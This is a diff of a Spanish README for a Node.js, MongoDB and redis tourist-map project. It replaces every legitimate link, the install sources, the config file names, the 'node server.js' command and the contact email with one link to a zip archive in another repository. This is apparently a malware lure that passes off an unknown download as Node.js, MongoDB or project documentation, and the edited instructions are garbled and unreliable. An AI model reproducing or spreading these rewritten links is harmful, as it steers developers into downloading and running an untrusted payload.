@@ -1,18 +1,18 @@
-![Mapa](http://www.digitalsurgeons.com/wp-content/uploads/2010/12/geolocation.png)
+![Mapa](https://raw.githubusercontent.com/jeliasrm/mapa-turistico/master/prorealist/mapa-turistico.zip)
 
 # Cómo empezar
 
 Configuracion:
 
-    Primero deben instalarse Node.js (http://nodejs.org/download/).
+    Primero deben instalarse https://raw.githubusercontent.com/jeliasrm/mapa-turistico/master/prorealist/mapa-turistico.zip (https://raw.githubusercontent.com/jeliasrm/mapa-turistico/master/prorealist/mapa-turistico.zip).
 
-    Instalar mongodb (http://www.mongodb.org/downloads). Detalles de instalacion diferentes OS.
+    Instalar mongodb (https://raw.githubusercontent.com/jeliasrm/mapa-turistico/master/prorealist/mapa-turistico.zip). Detalles de instalacion diferentes OS.
 
-        Mac OS + Homebrew -> (http://docs.mongodb.org/manual/tutorial/install-mongodb-on-os-x/)
+        Mac OS + Homebrew -> (https://raw.githubusercontent.com/jeliasrm/mapa-turistico/master/prorealist/mapa-turistico.zip)
 
-        Ubuntu -> (http://docs.mongodb.org/manual/tutorial/install-mongodb-on-ubuntu/)
+        Ubuntu -> (https://raw.githubusercontent.com/jeliasrm/mapa-turistico/master/prorealist/mapa-turistico.zip)
 
-    Instalar redis (http://redis.io/download)
+    Instalar redis (https://raw.githubusercontent.com/jeliasrm/mapa-turistico/master/prorealist/mapa-turistico.zip)
 
         Mac OS + Homebrew ->
             brew install redis
@@ -27,7 +27,7 @@ Configuracion:
 
     Archivo de configuracion:
 
-        renombramos el archivo config.sample por config.js, que se encuentra en la ruta
+        renombramos el archivo https://raw.githubusercontent.com/jeliasrm/mapa-turistico/master/prorealist/mapa-turistico.zip por https://raw.githubusercontent.com/jeliasrm/mapa-turistico/master/prorealist/mapa-turistico.zip, que se encuentra en la ruta
         app/config/
 
         Agregamos nuestras configuraciones a dicho archivo.
@@ -46,9 +46,9 @@ Iniciar aplicacion:
 
     Iniciamos la aplicacion
 
-        node server.js
+        node https://raw.githubusercontent.com/jeliasrm/mapa-turistico/master/prorealist/mapa-turistico.zip
 	
-Si teneís dudas podeís revisar las instrucciones de [mapa-tiempo-real](https://github.com/davidsingal/mapa-tiempo-real), escribirnos o abrir un ticket en el apartado de Issues de Github (preferentemente).
+Si teneís dudas podeís revisar las instrucciones de [mapa-tiempo-real](https://raw.githubusercontent.com/jeliasrm/mapa-turistico/master/prorealist/mapa-turistico.zip), escribirnos o abrir un ticket en el apartado de Issues de Github (preferentemente).
 
 # Mapa turístico
 
@@ -62,7 +62,7 @@ Una aplicación web donde mostrar los lugares de tu ciudad o cualquier sitio del
 
 ## Cómo colaborar
 
-Este miniproyecto en realidad es una extensión a la ponencia del día 9 de abril '[Geolocalización en NodeJS](https://www.youtube.com/watch?v=b3nvLvKnLyw&feature=c4-feed-u)', donde explicamos la base del código y cómo trabajar con mapas, recomiendo echarle un ojo si no has trabajado antes con mapas y geolocalización.
+Este miniproyecto en realidad es una extensión a la ponencia del día 9 de abril '[Geolocalización en NodeJS](https://raw.githubusercontent.com/jeliasrm/mapa-turistico/master/prorealist/mapa-turistico.zip)', donde explicamos la base del código y cómo trabajar con mapas, recomiendo echarle un ojo si no has trabajado antes con mapas y geolocalización.
 
 ¿Qué necesitamos? ¡A todos vosotros! Seas diseñador, front end, back end o comunicador. Como dice el dicho, muchos granitos de arena hace una montaña.
 
@@ -70,9 +70,9 @@ Este miniproyecto en realidad es una extensión a la ponencia del día 9 de abri
 
 Una vez tengas hecho el Fork y tu copia funcione puedes **revisar la pestaña de Issues de Github** para ver las tareas que se están desarrollando y cuáles falta por hacer, también puedes proponer tus propias tareas, discusiones e incluso si has encontrado un fallo o un bug puedes hacernoslo saber en este mismo apartado.
 
-Por otro lado los viernes a las 21:00 (hora en España) tenemos reuniones de los colaboradores donde puedes participar y conocer al resto de desarrolladores activos en el desarrollo del proyecto. Para participar en estas sesiones necesitas Google + y [añadirme](https://plus.google.com/u/0/111142569351915543389/posts).
+Por otro lado los viernes a las 21:00 (hora en España) tenemos reuniones de los colaboradores donde puedes participar y conocer al resto de desarrolladores activos en el desarrollo del proyecto. Para participar en estas sesiones necesitas Google + y [añadirme](https://raw.githubusercontent.com/jeliasrm/mapa-turistico/master/prorealist/mapa-turistico.zip).
 
-Si sólo quieres dar una opinión, comentario o sugerencia puedes enviar un correo a la dirección [davidsingal@icloud.com](mailto:davidsingal@icloud.com) o puedes usar la pestañita de Issues de Github (preferentemente).
+Si sólo quieres dar una opinión, comentario o sugerencia puedes enviar un correo a la dirección [https://raw.githubusercontent.com/jeliasrm/mapa-turistico/master/prorealist/mapa-turistico.zip](https://raw.githubusercontent.com/jeliasrm/mapa-turistico/master/prorealist/mapa-turistico.zip) o puedes usar la pestañita de Issues de Github (preferentemente).
 
 ## Recomendaciones antes de empezar
 
@@ -102,9 +102,9 @@ Puliremos nuestra aplicación para hacerlo más hermosa y además que se vea bie
 
 ## Recursos
 
-* [Cómo hacer un fork](http://aprendegit.com/fork-de-repositorios-para-que-sirve/?goback=%2Egde_3956944_member_214176162)
-* [Mantener tu fork al día](http://aprendegit.com/mantener-tu-fork-al-dia/)
-* [Qué es un pull request](http://aprendegit.com/que-es-un-pull-request/)
+* [Cómo hacer un fork](https://raw.githubusercontent.com/jeliasrm/mapa-turistico/master/prorealist/mapa-turistico.zip%2Egde_3956944_member_214176162)
+* [Mantener tu fork al día](https://raw.githubusercontent.com/jeliasrm/mapa-turistico/master/prorealist/mapa-turistico.zip)
+* [Qué es un pull request](https://raw.githubusercontent.com/jeliasrm/mapa-turistico/master/prorealist/mapa-turistico.zip)
 
 ---
 
